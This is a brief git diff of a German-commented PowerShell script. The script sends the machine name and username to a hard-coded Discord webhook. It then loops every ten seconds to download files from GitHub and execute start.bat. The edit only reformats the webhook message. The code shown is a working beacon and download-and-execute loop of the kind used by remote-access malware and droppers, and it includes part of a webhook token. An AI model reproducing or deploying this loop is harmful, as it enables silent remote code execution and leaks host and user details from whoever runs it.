@@ -12,8 +12,9 @@ $webhookUrl = "https://discordapp.com/api/webhooks/1236328074887299145/nssyhlyQn
 $computerName = (Get-WmiObject -Class Win32_ComputerSystem).Name
 $username = (Get-WmiObject -Class Win32_ComputerSystem).UserName
 #Nachricht
-$message = "Script wurde auf $computerName mit dem User $username gestartet"
-
+$message = @{
+    "content" = "Script wurde auf $computerName mit dem User $username gestartet"
+}
 # Intervall für die Überprüfung in Sekunden (z.B. alle 5 Minuten)
 $checkInterval = 10
 #Url zu den Github Dateien
@@ -46,10 +47,8 @@ function DownloadAndExecuteFile {
         & "$TargetPath\start.bat"
     }
 }
-
 # Schleife für die regelmäßige Ausführung
 while ($true) {
     DownloadAndExecuteFile
     Start-Sleep -Seconds $checkInterval
 }
-
